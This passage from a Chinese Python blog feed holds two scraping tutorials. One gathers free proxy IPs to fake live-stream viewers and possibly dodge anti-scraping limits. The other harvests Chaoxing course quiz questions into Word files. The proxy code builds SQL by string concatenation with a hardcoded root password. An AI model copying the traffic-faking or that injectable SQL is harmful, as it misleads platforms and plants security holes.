<li>等好久都不成功，才想起我们的目标只是拿到管理员密码。。。。。<br><img src="https://img-blog.csdnimg.cn/20200413180149362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2></li>
<li>本次SQL注入到此结束，还愣着干啥，点赞关注走一走啊。。。。（￣︶￣）↗</li>
</ul>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次用Python爬取代理IP并使用（尝试用代理IP制造直播房间访问量）</title>
    <url>/2020/03/31/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%94%A8Python%E7%88%AC%E5%8F%96%E4%BB%A3%E7%90%86IP%E5%B9%B6%E4%BD%BF%E7%94%A8%EF%BC%88%E5%B0%9D%E8%AF%95%E7%94%A8%E4%BB%A3%E7%90%86IP%E5%88%B6%E9%80%A0%E7%9B%B4%E6%92%AD%E6%88%BF%E9%97%B4%E8%AE%BF%E9%97%AE%E9%87%8F%EF%BC%89/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
<li>首先说一下代理IP的用法途（代码中会有涉及）：代理IP可以用来隐藏你的真实IP，你访问网站是通过代理服务器来做一个中转，所以目标服务器只能看到代理服务器的IP地址，这样就可以让你的IP地址实现隐身的功能 </li>
</ul>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul>
<li>我这边是找到了一个平台：<a href="https://www.kuaidaili.com/%EF%BC%8C%E5%85%88%E5%9C%A8%E5%9C%B0%E5%9D%80%E5%90%8E%E9%9D%A2%E5%8A%A0robots.txt%E6%9F%A5%E7%9C%8B%E5%B9%B3%E5%8F%B0%E7%9A%84robots%E5%8D%8F%E8%AE%AE%EF%BC%88https://www.kuaidaili.com/robots.txt%EF%BC%89%E5%A6%82%E4%B8%8B%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E5%B9%B3%E5%8F%B0%E6%9C%AA%E6%98%8E%E4%BB%A4%E7%A6%81%E6%AD%A2%E7%88%AC%E8%99%AB%E7%88%AC%E5%8F%96%E7%9A%84%E9%A1%B5%E9%9D%A2%EF%BC%8C%E9%82%A3%E6%88%91%E4%BB%AC%E5%B0%B1%E5%8F%AF%E4%BB%A5%E6%94%BE%E5%BF%83%E7%88%AC%E4%BA%86%E3%80%82">https://www.kuaidaili.com/，先在地址后面加robots.txt查看平台的robots协议（https://www.kuaidaili.com/robots.txt）如下，可以看到平台未明令禁止爬虫爬取的页面，那我们就可以放心爬了。</a><br><img src="https://img-blog.csdnimg.cn/20200331123756470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>按f12分析一下页面先，左上角箭头选中ip之后直接右键复制XPath。<br><img src="https://img-blog.csdnimg.cn/20200331124128212.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>测试后发现，IP不是通过接口传输的，而是存在在静态页面上，这就省事很多了。</li>
<li>并且，点击下一页后，url变化很小。</li>
<li>url很简单，这里就不过多分析了，直接上代码。<h2 id="上代码"><a href="#上代码" class="headerlink" title="上代码"></a>上代码</h2></li>
<li>首先爬取前五页。（这里要注意加上headers模拟浏览器访问）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#爬取数据</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ip</span>():</span></span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">        print(<span class="string">&quot;=============================正在抓取第&#123;&#125;页数据==============&quot;</span>.format(page))</span><br><span class="line">        base_url = <span class="string">&#x27;https://www.kuaidaili.com/free/inha/&#123;&#125;/&#x27;</span>.format(page)</span><br><span class="line">        headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0&#x27;</span>&#125;</span><br><span class="line">    </span><br><span class="line">        response = requests.get(base_url,headers=headers)</span><br><span class="line">        data = response.text</span><br><span class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        html_data = parsel.Selector(data)</span><br><span class="line">        <span class="comment"># 解析数据</span></span><br><span class="line">        parsel_list = html_data.xpath(<span class="string">&#x27;//table[@class=&quot;table table-bordered table-striped&quot;]/tbody/tr&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> tr <span class="keyword">in</span> parsel_list:</span><br><span class="line">            proxies_dict = &#123;&#125; </span><br><span class="line">            http_type = tr.xpath(<span class="string">&#x27;./td[4]/text()&#x27;</span>).extract_first()  <span class="comment">#用xpath找到目标</span></span><br><span class="line">            ip_num = tr.xpath(<span class="string">&#x27;./td[1]/text()&#x27;</span>).extract_first()</span><br><span class="line">            ip_port = tr.xpath(<span class="string">&#x27;./td[2]/text()&#x27;</span>).extract_first()</span><br><span class="line">            proxies_dict[http_type] = ip_num + <span class="string">&#x27;:&#x27;</span> + ip_port	<span class="comment">#将ip地址和端口号用&quot;:&quot;连接</span></span><br><span class="line">            proxies_list.append(proxies_dict)</span><br><span class="line">            print(proxies_dict)</span><br><span class="line">            time.sleep(<span class="number">0.5</span>) </span><br><span class="line">        print(proxies_list) </span><br><span class="line">        print(<span class="string">&quot;获取到的代理ip数量：&quot;</span>,len(proxies_list))</span><br><span class="line">    <span class="keyword">return</span> proxies_list</span><br></pre></td></tr></table></figure>
<ul>
<li>然后，考虑到有些ip能用，有些ip不能用，所以需要对其进行清洗。剔除不能用的或反应慢的。这里可以试着用代理ip访问一下百度首页，并检测返回状态来确定ip是否可用。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_ip</span>(<span class="params">proxies_list</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;检测代理ip的质量&quot;&quot;&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0&#x27;</span>&#125;</span><br><span class="line">    can_use = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> proxy <span class="keyword">in</span> proxies_list:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(<span class="string">&#x27;https://www.baidu.com&#x27;</span>,headers=headers,proxies=proxy,timeout=<span class="number">0.08</span>)         <span class="comment">#代理ip使用方式，如果要筛选更快的ip，timeout可适当降低</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>: <span class="comment">#返回状态码为200即为可用</span></span><br><span class="line">                can_use.append(proxy)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">    <span class="keyword">return</span> can_use</span><br></pre></td></tr></table></figure>
<ul>
<li>简单组合一下，爬取部分就算搞完了。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ip_list = get_ip()	<span class="comment">#获取IP</span></span><br><span class="line">can_use = can_use(ip_list)	<span class="comment">#清洗IP</span></span><br></pre></td></tr></table></figure>
<h2 id="代理IP使用"><a href="#代理IP使用" class="headerlink" title="代理IP使用"></a>代理IP使用</h2><ul>
<li>这是我当时脑门一热想到的通过用代理ip进入直播间来增加人气，实验后发现，我太天真了，实验失败，根本不能增加人气，各位可以传入别的网址来实现用代理IP访问固定网站，can_use参数就传入上面得到的can_use就行。<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span>(<span class="params">url,can_use</span>):</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> proxy <span class="keyword">in</span> can_use:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(url,headers=headers,proxies=proxy,timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">&quot;进入直播间。。。&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br></pre></td></tr></table></figure></li>
<li>其次，我觉得如果用代理IP爬取网站内容的话，可能会绕过网站的反爬策略，只是思考了一下，并未实践。</li>
<li>或者也可以将代理IP写入数据库，留着慢慢用。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 入库</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">engine_in</span>(<span class="params">ip_list</span>):</span></span><br><span class="line">    conn = pymysql.connect(host=<span class="string">&#x27;localhost&#x27;</span>,user=<span class="string">&#x27;root&#x27;</span>,password=<span class="string">&#x27;123&#x27;</span>,database=<span class="string">&#x27;size&#x27;</span>,port=<span class="number">3306</span>) <span class="comment">#连接数据库</span></span><br><span class="line">    cursor = conn.cursor()</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ip_list:</span><br><span class="line">        sql = <span class="string">&quot;INSERT INTO ip(ip) values(&#x27;&quot;</span> + ip + <span class="string">&quot;&#x27;);&quot;</span> <span class="comment">#SQL语句</span></span><br><span class="line">        cursor.execute(sql) <span class="comment">#执行SQL语句</span></span><br><span class="line">        conn.commit()</span><br><span class="line">    conn.close()</span><br></pre></td></tr></table></figure>

<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><ul>
<li>Tip：写爬虫前首先要看一下该网站的robots.txt协议是否允许爬取，在其允许范围内适当爬取数据。<blockquote>
<p>爬取代理ip的想法是我从某学习平台学到的，若有冒犯，请联系删除</p>
</blockquote>
</li>
</ul>
]]></content>
      <categories>
        <category>爬虫笔记</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次用Python爬取超星学习通课后小测验并写入Word文档（完整思路）</title>
    <url>/2020/05/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%94%A8Python%E7%88%AC%E5%8F%96%E8%B6%85%E6%98%9F%E5%AD%A6%E4%B9%A0%E9%80%9A%E8%AF%BE%E5%90%8E%E5%B0%8F%E6%B5%8B%E9%AA%8C%E5%B9%B6%E5%86%99%E5%85%A5Word%E6%96%87%E6%A1%A3%EF%BC%88%E5%AE%8C%E6%95%B4%E6%80%9D%E8%B7%AF%EF%BC%89/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul>
<li>开门见山，直接切入正题，先看最终效果<br><img src="https://img-blog.csdnimg.cn/20200525180742278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20200525180825108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>最终效果很理想，但这个过程是非常残酷的。</li>
</ul>
<h1 id="爬取流程"><a href="#爬取流程" class="headerlink" title="爬取流程"></a>爬取流程</h1><h2 id="敲代码前的试探"><a href="#敲代码前的试探" class="headerlink" title="敲代码前的试探"></a>敲代码前的试探</h2><ul>
<li>先实验能否直接得到题目。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">courseId = <span class="number">208420018</span></span><br><span class="line">mHeaders = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">r&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class="line">                  <span class="string">r&#x27;Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;https://mooc1.chaoxing.com/nodedetailcontroller/visitnodedetail?courseId=208255733&amp;knowledgeId=263215264&quot;</span></span><br><span class="line"></span><br><span class="line">mHtml = requests.get(url,headers = mHeaders).content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;人类进入21世纪&#x27;</span> <span class="keyword">in</span> mHtml:</span><br><span class="line">    print(<span class="string">&#x27;甩了&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&#x27;不妥&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>输出结果——不妥，说明并不能够通过静态页面直接爬取题目。一般经验肯定是认为是接口传输的，于是开始找接口。。。。<br><img src="https://img-blog.csdnimg.cn/20200525194057244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>但是，网络传输的数据除了图片就剩html，css和js了，根本找不到传输题目的接口。</li>
<li>当我把指针选中所有题目时，我发现了一个以我的前端知识理解不了的东西。<br><img src="https://img-blog.csdnimg.cn/20200525194727373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>Html中又镶嵌了一个Html，emmm…..这就触及到我的知识盲区了。而且，点击下面的iframe标签里的src会跳转到一个新的页面，而这个页面正是所有的测验题目！！！<br><img src="https://img-blog.csdnimg.cn/20200525194957159.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>用postman简单Get一下，发现能够得到所有的题目！<br><img src="https://img-blog.csdnimg.cn/20200525195204505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>接下来就改分析url了，总共有7个参数，其中下图打√的是必须的，其他几个可以不加。方法：用postman挨个请求就行。对于这三个参数，courseId是本来就知道的，那么我们的目标就是找到workId和knowledgeid即可。<br><img src="https://img-blog.csdnimg.cn/20200525195515841.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>一番寻找后，发现knowledgeid通过静态页面就能获取。<br><img src="https://img-blog.csdnimg.cn/202005252001593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>而workId在刚才找到的iframe标签的测验地址里，有人可能会问，那为啥不直接用测验地址呢，这我也试过，但是postman请求后的结果发现，得到的iframe标签里并没有地址，但是有个data属性，其中基本全是html转义符。<br><img src="https://img-blog.csdnimg.cn/20200525200557642.png" alt="在这里插入图片描述"></li>
<li>用Python的html库反转义后可得到workId。（后来发现，反转义与否不影响获取，直接用正则表达式就可以得到）<br><img src="https://img-blog.csdnimg.cn/20200525200851250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><h2 id="通过试探，总结一下编程思路。"><a href="#通过试探，总结一下编程思路。" class="headerlink" title="通过试探，总结一下编程思路。"></a>通过试探，总结一下编程思路。</h2></li>
</ul>
<ol>
<li>首先得到课程ID（courseId），并组成url供后续访问得到章节ID(knowledgeId)；</li>
<li>其次，通过访问主页面得到每一个knowledgeId，将knowledgeId和courseId组成url供后续获取workId；</li>
<li>然后，访问用courseId和knowledgeId组成的url，得到章节的workId，并将courseId，knowledgeId和workId组成最终的小测验地址；</li>
<li>对小测验地址进行访问，挨个爬取题目、选项并写入Word文档。<h2 id="思路有了，上代码！"><a href="#思路有了，上代码！" class="headerlink" title="思路有了，上代码！"></a>思路有了，上代码！</h2></li>
<li>课程ID直接给，组成url并访问，得到页面。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHtml</span>():</span>  <span class="comment">#得到页面</span></span><br><span class="line">    mUrl = url.replace(<span class="string">&#x27;&#123;&#123;courseId&#125;&#125;&#x27;</span>,courseId)</span><br><span class="line">    response = requests.get(mUrl,headers=mHeaders)</span><br><span class="line">    response.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    mHtml = html.unescape(response.text)        <span class="comment">#Html反转义</span></span><br><span class="line">    <span class="comment">#response.encoding = &#x27;utf-8&#x27;</span></span><br><span class="line">    print(mHtml)</span><br><span class="line">    <span class="keyword">return</span> mHtml</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>得到每一个小节的knowledgeId并和courseId组成url，并对爬取的地址进行试探是否是章节的地址。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCourseUrlList</span>(<span class="params">zhtml</span>):</span>  <span class="comment">#得到可以用的每一个课时的Url</span></span><br><span class="line">    divList = []</span><br><span class="line">    re_rule = <span class="string">&#x27;courseId=&#x27;</span> + courseId + <span class="string">&#x27;&amp;knowledgeId=(.*?)&quot;&gt;&#x27;</span></span><br><span class="line">    <span class="comment"># for i in re.findall(re_rule,html):</span></span><br><span class="line">    <span class="comment">#     divList.append(i)</span></span><br><span class="line">    divList = re.findall(re_rule,zhtml)</span><br><span class="line">    urlList = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> divList:</span><br><span class="line">        mUrl = <span class="string">&#x27;https://mooc1.chaoxing.com/nodedetailcontroller/visitnodedetail?courseId=&#x27;</span>+courseId+<span class="string">&#x27;&amp;knowledgeId=&#x27;</span>+i</span><br><span class="line">        print(mUrl)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(mUrl,headers=mHeaders,timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="keyword">if</span> courseId <span class="keyword">in</span> response.text:</span><br><span class="line">                     urlList.append(mUrl)</span><br><span class="line">                     print(<span class="string">&#x27;访问成功&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">&#x27;非课程网页&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(<span class="string">&#x27;访问失败&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> urlList</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>得到workId并和courseId、knowledgeId组成小测验的url。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getZuoYeUrl</span>(<span class="params">urlList</span>):</span>       <span class="comment">#得到测验的Url</span></span><br><span class="line">    tUrlList = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> urlList:</span><br><span class="line">        response = requests.get(i,headers=mHeaders).content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        res = re.findall(<span class="string">&#x27;workid&amp;quot;:&amp;quot;(.*?)&amp;quot;,&#x27;</span>, response)</span><br><span class="line">        <span class="keyword">if</span> len(res):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">                tUrl = <span class="string">&quot;https://mooc1.chaoxing.com/api/selectWorkQuestion?workId=&quot;</span>+i+<span class="string">&quot;&amp;ut=null&amp;classId=0&amp;courseId=&quot;</span>+courseId</span><br><span class="line">                tUrlList.append(tUrl)</span><br><span class="line">    <span class="keyword">return</span> tUrlList</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>访问小测验的地址并爬取标题、题干、选项写入Word文档。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writeDocx</span>(<span class="params">urlList</span>):</span>          <span class="comment">#从测验Url中读取题目并写入Word文档</span></span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urlList:</span><br><span class="line">        mHtml = requests.get(url, headers=mHeaders).content.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        file = docx.Document()</span><br><span class="line">        h3 = re.findall(<span class="string">&#x27;&lt;h3&gt;(.*?)&lt;/h3&gt;&#x27;</span>, mHtml)</span><br><span class="line">        Title = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> h3:</span><br><span class="line">            Title = html.unescape(i)</span><br><span class="line">            file.add_heading(Title)</span><br><span class="line"></span><br><span class="line">        text = html.unescape(mHtml)</span><br><span class="line">        mHtml = etree.HTML(text)  <span class="comment"># 将html转换为xml</span></span><br><span class="line">        timuList = mHtml.xpath(<span class="string">&#x27;//div[@class=&quot;TiMu&quot;]&#x27;</span>)  <span class="comment"># 找到每一个题目及其所有选项</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> timuList:</span><br><span class="line">            time.sleep(<span class="number">0.05</span>)</span><br><span class="line">            mStr = etree.tostring(i).decode(<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># 将xml树结点读出并转换为utf-8格式</span></span><br><span class="line">            res = html.unescape(mStr)  <span class="comment"># 解码xml</span></span><br><span class="line">            tType = re.findall(<span class="string">&#x27;(【.*?】)&#x27;</span>, res)</span><br><span class="line">            tRType = []</span><br><span class="line">            <span class="keyword">for</span> a <span class="keyword">in</span> tType:</span><br><span class="line">                p_rule = <span class="string">&#x27;&lt;.*?&gt;&#x27;</span>	</span><br><span class="line">                tRType.append(re.sub(p_rule,<span class="string">&#x27;&#x27;</span>,str(a)))	<span class="comment">#删除所有的html标签</span></span><br><span class="line">            tGan = re.findall(<span class="string">&#x27;】&lt;?p?&gt;?(.*?)&lt;/p&gt;&#x27;</span>, res)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(tGan):</span><br><span class="line">                tGan = re.findall(<span class="string">&#x27;&lt;div class=&quot;Zy_TItle_p&quot;&gt;(.*?)&lt;/div&gt;&#x27;</span>, res)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(tGan):</span><br><span class="line">                tGan = re.findall(<span class="string">&#x27;】(.*?)&lt;/div&gt;&#x27;</span>,res)</span><br><span class="line">            tRGan = []</span><br><span class="line">            <span class="keyword">for</span> a <span class="keyword">in</span> tGan:</span><br><span class="line">                p_rule = <span class="string">&#x27;&lt;.*?&gt;&#x27;</span></span><br><span class="line">                tRGan.append(re.sub(p_rule,<span class="string">&#x27;&#x27;</span>,str(a)))</span><br><span class="line">            file.add_paragraph(tRType + tRGan)</span><br><span class="line">            <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                for j in tType:</span></span><br><span class="line"><span class="string">                print(j)</span></span><br><span class="line"><span class="string">                file.add_paragraph(j)</span></span><br><span class="line"><span class="string">            for j in tGan:</span></span><br><span class="line"><span class="string">                print(j)</span></span><br><span class="line"><span class="string">                file.add_paragraph(j)</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span></span><br><span class="line">            XuanXiang = etree.HTML(res)</span><br><span class="line">            tAny = XuanXiang.xpath(<span class="string">&#x27;//li[@class=&quot;clearfix&quot;]&#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> tAny:</span><br><span class="line">                tStr = etree.tostring(j).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                tRes = html.unescape(tStr)</span><br><span class="line">                tXuan = re.findall(<span class="string">&#x27;&lt;i class=&quot;fl&quot;&gt;(.*?)&lt;/i&gt;.*?none;&quot;&gt;&lt;?p?&gt;?(.*?)&lt;?/?p?&gt;?&lt;/a&gt;&lt;/li&gt;&#x27;</span>, tRes)</span><br><span class="line">                tRXuan = []</span><br><span class="line">                <span class="keyword">for</span> a <span class="keyword">in</span> tXuan:</span><br><span class="line">                    tRRXuan = <span class="string">&quot;&quot;</span></span><br><span class="line">                    <span class="keyword">for</span> b <span class="keyword">in</span> a:</span><br><span class="line">                        p_rule = <span class="string">&#x27;&lt;.*?&gt;&#x27;</span></span><br><span class="line">                        tRRXuan = tRRXuan + re.sub(p_rule, <span class="string">&#x27;&#x27;</span>, str(b))</span><br><span class="line">                    tRXuan.append(tRRXuan)</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> tRXuan:</span><br><span class="line">                    file.add_paragraph(k)</span><br><span class="line"></span><br><span class="line">        file.save(<span class="string">&quot;D:\\&quot;</span>+Title+<span class="string">&quot;.docx&quot;</span>)</span><br><span class="line">        file.close()	</span><br><span class="line">        print(Title+<span class="string">&#x27;爬取完成&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>其余代码</li>
</ul>
<ol>
<li>全局变量及导库（放在开头）</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> docx</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://mooc1.chaoxing.com/course/&#123;&#123;courseId&#125;&#125;.html&quot;</span></span><br><span class="line">mHeaders = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">r&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class="line">                  <span class="string">r&#x27;Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>主函数</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    courseId = <span class="string">&quot;208255733&quot;</span>	<span class="comment">#通过改变courseId可以实现爬取不同的课程，也可以课程号自加循环爬取，但课程量太大，就不一一编写。</span></span><br><span class="line">    zHtml = getHtml()</span><br><span class="line">    canUseUrl = getCourseUrlList(zHtml)</span><br><span class="line">    zuoYeUrl = getZuoYeUrl(canUseUrl)</span><br><span class="line">    writeDocx(zuoYeUrl)</span><br></pre></td></tr></table></figure>

<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><ul>
<li>经实验，本程序适用于大部分超星学习通课程，课程号可以在访问该课程时的地址栏url中获取。</li>
<li>不要脸的推荐本人的其余爬虫文章：<a href="https://blog.csdn.net/weixin_44371842/article/details/105133663">记一次用Python统计全国女性Size</a></li>
<li>如复制出错，可去博主Github取完整代码<a href="https://github.com/lrffun/My_Python/tree/master/GetProblemSets">点击直达</a>，记得点个star哦，感激不尽。</li>
<li>如有大佬发现文章错误，或代码错误，烦请指正，感激不尽。</li>
<li>创作不易，转载请注明出处，感谢。</li>
</ul>
]]></content>
      <categories>
        <category>爬虫笔记</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次用Python统计全国女性Size</title>
    <url>/2020/03/27/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%94%A8Python%E7%BB%9F%E8%AE%A1%E5%85%A8%E5%9B%BD%E5%A5%B3%E6%80%A7Size/</url>
